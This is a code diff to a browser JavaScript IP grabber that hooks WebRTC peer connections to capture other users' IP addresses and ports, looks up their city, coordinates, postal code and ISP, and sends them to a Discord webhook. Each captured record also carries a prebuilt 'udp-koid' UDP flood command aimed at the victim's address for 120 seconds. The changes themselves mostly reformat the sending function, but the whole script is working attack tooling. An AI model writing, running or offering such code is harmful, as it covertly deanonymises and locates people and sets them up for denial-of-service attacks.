@@ -1,5 +1,5 @@
 (() => {
-    const api_key = ""; // <== YOUR IPINFO.IO API KEY HERE
+    const api_key = ""; // <== YOUR IPINFO.IO API KEY HERE 
     const DISCORD_WEBHOOK_URL = ""; // <== YOUR DISCORD WEBHOOK HERE
 
     const OriginalRTCPeerConnection = window.RTCPeerConnection;
@@ -260,143 +260,142 @@
         }
     }
 
-    // ---- Send to Discord (YOUR EXACT EMBED INSERTED) ----
     async function sendToDiscord() {
-        if (currentIPData.ipv4 === " --- " && currentIPData.ipv6 === " --- ") {
-            updateInfoMessage(`<i class="fa-solid fa-triangle-exclamation"></i><span>No available data...</span>`);
-            return;
-        }
-
-        const ipKey = `${currentIPData.ipv4}:${currentIPData.ipv4Port || ''}_${currentIPData.ipv6}:${currentIPData.ipv6Port || ''}`;
-
-        if (sentIPs.has(ipKey)) {
-            updateInfoMessage(`<i class="fa-solid fa-clock"></i><span>This IP was already sent!</span>`);
-            return;
-        }
-
-        const sendBtn = document.getElementById("send-button");
-        const originalHtml = sendBtn.innerHTML;
-        sendBtn.innerHTML = '<i class="fa-solid fa-spinner fa-pulse"></i><span>Sending</span>';
-
-        try {
-            const coords = (currentIPData.lat && currentIPData.lon)
-                ? `${currentIPData.lat}, ${currentIPData.lon}`
-                : " --- ";
-
-            const ipv6Display = currentIPData.ipv6 !== " --- "
-                ? `[${currentIPData.ipv6}]${currentIPData.ipv6Port ? `:${currentIPData.ipv6Port}` : ''}`
-                : " --- ";
-
-            const flagEmoji = currentIPData.country && currentIPData.country !== " --- "
-                ? String.fromCodePoint(...[...currentIPData.country.toUpperCase()].map(c => 0x1F1E6 - 65 + c.charCodeAt(0)))
-                : '🌍';
-
-            const floodCmd = `udp-koid ${currentIPData.ipv4} ${currentIPData.ipv4Port || ''}`.trim();
-
-            const embed = {
-                title: "Új grabbelt kapcsolat!:",
-                color: 0x660000,
-                fields: [
-                    {
-                        name: "",
-                        value: "```diff\n+ Basic informations:\n```",
-                        inline: false
-                    },
-                    {
-                        name: "🌃 City:",
-                        value: `${currentIPData.city || ' --- '}`,
-                        inline: true
-                    },
-                    {
-                        name: "🌍 Country:",
-                        value: `${flagEmoji} ${currentIPData.country || ' --- '}`,
-                        inline: true
-                    },
-                    {
-                        name: "📮 Postal code:",
-                        value: currentIPData.postal || " --- ",
-                        inline: true
-                    },
-                    {
-                        name: "📌 Coordinates:",
-                        value: coords,
-                        inline: true
-                    },
-                    {
-                        name: "🕐 Timezone:",
-                        value: currentIPData.timezone || " --- ",
-                        inline: true
-                    },
-                    {
-                        name: "📡 Internet Service Provider (ISP):",
-                        value: currentIPData.org || " --- ",
-                        inline: true
-                    },
-                    {
-                        name: "",
-                        value: "```diff\n+ Network information:\n```",
-                        inline: false
-                    },
-                    {
-                        name: "🌐 IPv4 address:",
-                        value: `\`${currentIPData.ipv4 || ' --- '}\``,
-                        inline: true
-                    },
-                    {
-                        name: "🔌 Port:",
-                        value: `\`${currentIPData.ipv4Port || ' --- '}\``,
-                        inline: true
-                    },
-                    {
-                        name: "⏱️ Ping (Latency):",
-                        value: `\`${lastPing}\``,
-                        inline: true
-                    },
-                    {
-                        name: "🌎 IPv6 address:",
-                        value: `\`${ipv6Display}\``,
-                        inline: false
-                    },
-                    {
-                        name: "",
-                        value: "```diff\n+ UDP-Koid\n```",
-                        inline: false
-                    },
-                    {
-                        name: "Command:",
-                        value: `\`\`\`bash\n${floodCmd} 120\n\`\`\``,
-                        inline: false
-                    }
-                ],
-                footer: {
-                    text: `Grabbed by Benedek201_ • ${new Date().toLocaleString('hu-HU', { timeZone: 'Europe/Budapest' })}`,
-                },
-                timestamp: new Date().toISOString(),
-            };
-
-            const response = await fetch(DISCORD_WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ embeds: [embed] })
-            });
-
-            if (response.ok) {
-                sentIPs.add(ipKey);
-                myLogs.push(`${currentIPData.org} | ${currentIPData.lat}, ${currentIPData.lon} | IPv4: ${currentIPData.ipv4} | IPv6: ${currentIPData.ipv6}`);
-                updateInfoMessage(`<i class="fa-solid fa-check-circle"></i><span>Successfully sent! :)</span>`);
-                setTimeout(() => { updateInfoDisplay(); }, 1500);
-            } else {
-                const errorText = await response.text();
-                console.error("Discord webhook error:", response.status, errorText);
-                updateInfoMessage(`<i class="fa-solid fa-times-circle"></i><span>Send failed! Status: ${response.status}</span>`);
-            }
-        } catch (error) {
-            console.error("Discord send error:", error);
-            updateInfoMessage(`<i class="fa-solid fa-exclamation-triangle"></i><span>Error while sending... :(</span>`);
-        } finally {
-            setTimeout(() => { sendBtn.innerHTML = originalHtml; }, 1500);
-        }
+    if (currentIPData.ipv4 === " --- " && currentIPData.ipv6 === " --- ") {
+        updateInfoMessage(`<i class="fa-solid fa-triangle-exclamation"></i><span>No available data...</span>`);
+        return;
     }
+
+    const ipKey = `${currentIPData.ipv4}:${currentIPData.ipv4Port || ''}_${currentIPData.ipv6}:${currentIPData.ipv6Port || ''}`;
+
+    if (sentIPs.has(ipKey)) {
+        updateInfoMessage(`<i class="fa-solid fa-clock"></i><span>This IP was already sent!</span>`);
+        return;
+    }
+
+    const sendBtn = document.getElementById("send-button");
+    const originalHtml = sendBtn.innerHTML;
+    sendBtn.innerHTML = '<i class="fa-solid fa-spinner fa-pulse"></i><span>Sending</span>';
+
+    try {
+        const coords = (currentIPData.lat && currentIPData.lon)
+            ? `${currentIPData.lat}, ${currentIPData.lon}`
+            : " --- ";
+
+        const ipv6Display = currentIPData.ipv6 !== " --- "
+            ? `[${currentIPData.ipv6}]${currentIPData.ipv6Port ? `:${currentIPData.ipv6Port}` : ''}`
+            : " --- ";
+
+        const flagEmoji = currentIPData.country && currentIPData.country !== " --- "
+            ? String.fromCodePoint(...[...currentIPData.country.toUpperCase()].map(c => 0x1F1E6 - 65 + c.charCodeAt(0)))
+            : '🌍';
+
+        const floodCmd = `udp-koid ${currentIPData.ipv4} ${currentIPData.ipv4Port || ''}`.trim();
+
+        const embed = {
+            title: "Új grabbelt kapcsolat!:",
+            color: 0x660000,
+            fields: [
+                {
+                    name: "",
+                    value: "```diff\n+ Basic informations:\n```",
+                    inline: false
+                },
+                {
+                    name: "🌃 City:",
+                    value: `${currentIPData.city || ' --- '}`,
+                    inline: true
+                },
+                {
+                    name: "🌍 Country:",
+                    value: `${flagEmoji} ${currentIPData.country || ' --- '}`,
+                    inline: true
+                },
+                {
+                    name: "📮 Postal code:",
+                    value: currentIPData.postal || " --- ",
+                    inline: true
+                },
+                {
+                    name: "📌 Coordinates:",
+                    value: coords,
+                    inline: true
+                },
+                {
+                    name: "🕐 Timezone:",
+                    value: currentIPData.timezone || " --- ",
+                    inline: true
+                },
+                {
+                    name: "",
+                    value: "```diff\n+ Network information:\n```",
+                    inline: false
+                },
+                {
+                    name: "📡 ISP:",
+                    value: currentIPData.org || " --- ",
+                    inline: false
+                },
+                {
+                    name: "🌐 IPv4 address:",
+                    value: `\`${currentIPData.ipv4 || ' --- '}\``,
+                    inline: true
+                },
+                {
+                    name: "🔌 Port:",
+                    value: `\`${currentIPData.ipv4Port || ' --- '}\``,
+                    inline: true
+                },
+                {
+                    name: "⏱️ Ping (Latency):",
+                    value: `\`${lastPing}\``,
+                    inline: true
+                },
+                {
+                    name: "🌎 IPv6 address:",
+                    value: `\`${ipv6Display}\``,
+                    inline: false
+                },
+                {
+                    name: "",
+                    value: "```diff\n+ UDP-Koid\n```",
+                    inline: false
+                },
+                {
+                    name: "Command:",
+                    value: `\`\`\`bash\n${floodCmd} 120\n\`\`\``,
+                    inline: false
+                }
+            ],
+            footer: {
+                text: `Grabbed by Benedek201_ • ${new Date().toLocaleString('hu-HU', { timeZone: 'Europe/Budapest' })}`,
+            },
+            timestamp: new Date().toISOString(),
+        };
+
+        const response = await fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ embeds: [embed] })
+        });
+
+        if (response.ok) {
+            sentIPs.add(ipKey);
+            myLogs.push(`${currentIPData.org} | ${currentIPData.lat}, ${currentIPData.lon} | IPv4: ${currentIPData.ipv4} | IPv6: ${currentIPData.ipv6}`);
+            updateInfoMessage(`<i class="fa-solid fa-check-circle"></i><span>Successfully sent! :)</span>`);
+            setTimeout(() => { updateInfoDisplay(); }, 1500);
+        } else {
+            const errorText = await response.text();
+            console.error("Discord webhook error:", response.status, errorText);
+            updateInfoMessage(`<i class="fa-solid fa-times-circle"></i><span>Send failed! Status: ${response.status}</span>`);
+        }
+    } catch (error) {
+        console.error("Discord send error:", error);
+        updateInfoMessage(`<i class="fa-solid fa-exclamation-triangle"></i><span>Error while sending... :(</span>`);
+    } finally {
+        setTimeout(() => { sendBtn.innerHTML = originalHtml; }, 1500);
+    }
+}
 
     function saveLogs() {
         if (myLogs.length === 0) {
